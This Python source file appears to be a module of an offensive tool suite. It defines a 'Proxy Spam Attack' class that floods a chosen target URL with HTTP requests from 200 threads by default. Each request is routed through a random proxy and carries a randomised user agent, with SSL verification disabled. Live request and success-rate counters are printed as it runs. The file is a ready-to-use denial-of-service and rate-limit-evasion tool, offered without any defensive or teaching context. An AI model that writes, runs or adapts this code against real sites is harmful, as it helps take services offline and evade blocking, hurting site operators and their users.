#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Proxy Spam Attack - Route through multiple proxies
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from colorama import Fore, Style
from core.utils.useragents import get_random_ua
from core.utils.proxy_manager import ProxyManager

class ProxySpam:
    """Spam through rotating proxies"""
    
    def __init__(self, target_url, threads=200):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.request_count = 0
        self.success_count = 0
        self.proxy_manager = ProxyManager()
        
    def attack_worker(self):
        """Worker thread using different proxies"""
        while self.running:
            try:
                # Get random proxy
                proxy = self.proxy_manager.get_random_proxy()
                if not proxy:
                    time.sleep(1)
                    continue
                
                # Create session with proxy
                session = requests.Session()
                session.proxies.update(proxy)
                
                # Headers
                ua = get_random_ua()
                headers = {'User-Agent': ua}
                
                # Send request through proxy
                response = session.get(
                    self.target_url, 
                    headers=headers, 
                    timeout=15,
                    verify=False
                )
                
                self.request_count += 1
                if response.status_code < 400:
                    self.success_count += 1
                
                if self.request_count % 50 == 0:
                    proxy_str = str(proxy)[:50]
                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] Req: {self.request_count} | Proxy: {proxy_str}{Style.RESET_ALL}")
                
                # Delay
                time.sleep(random.uniform(0.1, 0.5))
                
            except requests.exceptions.ProxyError:
                # Proxy failed, just continue
                pass
            except Exception:
                pass
    
    def start(self):
        """Start the proxy spam attack"""
        print(f"{Fore.YELLOW}\n   ╰─❯ Starting Proxy Spam Attack on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Proxies available: {len(self.proxy_manager.proxies)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Start workers
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker)
            worker.daemon = True
            worker.start()
        
        # Monitor
        try:
            last_count = 0
            while self.running:
                time.sleep(5)
                new_req = self.request_count - last_count
                last_count = self.request_count
                success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
                print(f"{Fore.CYAN}   ╰─❯ Req: {self.request_count} | Success: {self.success_count} ({success_rate:.1f}%) | Rate: {new_req/5:.1f} rps{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}\n   ╰─❯ Stopping Proxy Spam Attack...{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total requests: {self.request_count}{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Successful: {self.success_count}{Style.RESET_ALL}")
